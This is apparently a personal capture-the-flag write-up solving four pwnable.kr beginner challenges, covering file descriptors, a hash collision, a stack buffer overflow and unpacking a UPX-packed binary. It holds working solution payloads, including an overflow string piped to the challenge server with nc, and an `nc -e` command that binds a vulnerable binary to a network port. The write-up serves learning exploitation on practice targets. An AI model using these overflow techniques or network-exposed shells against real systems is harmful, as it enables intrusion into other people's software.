Toddler's Bottle
================

Codes: https://gist.github.com/siddharthasahu/f46a965d7ce34a4b24cc

fd
--

A simple one.

* atoi(const char *str): Converts the char stream of digits to int 
* read(int fdes, void *buf, size_t nbyte): Reads `nbytes` bytes into `buf` variable from `fdes` file descriptor. [http://codewiki.wikidot.com/c:system-calls:read]
* Hex to decimal conversions in bash: http://stackoverflow.com/questions/13280131/hexadecimal-to-decimal-in-shell-script

Rest is simply setting the file descriptor to stdin and passing the matching string:  
`echo "LETMEWIN" | ./fd 4660`  
or even better: `echo "LETMEWIN" | ./fd $(printf "%d" 0x1234)`

Pwned!

collision
---------

This one led to a revision of signed vs unsigned integers, data ranges in C and interplay between binary, ASCII and hex.

* New bash commands: `od`, `xxd`, data conversion in `bc`
* Need to take care of byte ordering
* http://stackoverflow.com/questions/9487037/passing-binary-data-as-arguments-in-bash

The trick is to pass in 20 bytes which is picked in the form of 5 ints and added to get the result.

One of the possible answers: `$'\xE8\x05\xD9\x1D\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'`

bof
---

Finally get to learn buffer overflows!

* Needs gdb debugging skills
* Function call conventions in x86: http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html

Objective is to replace the value of `key`. So basically one needs to calculate the position of the `key` variable in the stack and send an appropriate input so that it replaces `key` with desired data (0xcafebabe in this case).

GDB commands
$ gdb ./bof
(gdb) break func
(gdb) r
(gdb) disassemble

* From `lea    -0x2c(%ebp),%eax` in func+29, we come to know that the position of the `overflowme` variable in the stack, where our input starts getting stored is -0x2c = 44 bytes below the frame pointer (ebp).
* From function calling conventions, stack order is: function arguments -> eip (4 bytes) -> ebp (4 bytes) -> local variables. So position of `key` is 44 + 4 + 4 = 52 bytes from `overflowme` in the stack.
* From above and keeping in mind little endian systems, input can be: "a"*52+$'\xbe'$'\xba'$'\xfe'$'\xca'
* Trying: `echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"$'\xbe'$'\xba'$'\xfe'$'\xca' | nc pwnable.kr 9000`. Does not work.
* I did not solve this, but apparently the above format is closing the shell before commands can be sent.
* Repeat a character in bash: http://stackoverflow.com/questions/5349718/how-can-i-repeat-a-character-in-bash
* Final solution: `(echo $(printf "=%.0s" {1..52};printf "\xbe\xba\xfe\xca");cat) | nc pwnable.kr 9000`

TODO: Investigate why subshell with cat is needed here.

NOTES:  
* If you try to insert a random big input, it gives a "stack smashing detected" error. Interesting to know, but not relevant to this problem, because the hack is in the function itself.
* For running the binary locally: `while true;do nc -lp 9000 -e ./bof;done` (kill shell to exit)

flag
---

Given just a binary, how to analyse!

% `./flag`  
I will malloc() and strcpy the flag there. take it.

% `objdump -D flag`  
flag:     file format elf64-x86-64

So, flag is in the binary itself, but the objdump is not succeeding. Expected that it wouldn't be that easy.  

Lets see if we can extract some strings:  
$ `strings < flag`  
...  
$Info: This file is packed with the UPX executable packer http://upx.sf.net $  
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $  
...

Jackpot! So the binary has been packed. Lets install upx and unpack it.  
$ `upx -d ./flag`

Now we can run normal gdb commands:  
$ `gdb ./flag`
(gdb) break main
(gdb) r
(gdb) disassemble

* So the function copies the global (because of %rip usage) `flag` variable data to the malloc alllocated memory. We just need to find the address of the flag variable.
* We can notice the address gets copied to the %rsi register. So setting a breakpoint after the values are copied, we can extract the address.

(gdb) break *0x401195   => address after values are copied, so after the mov %rdx,%rsi and mov %rax,%rdi commands
(gdb) s
(gdb) p/x $rsi        => eg 0x496628
(gdb) x/100c $rsi     => Printing flag in character form, we get the string.

Fun!
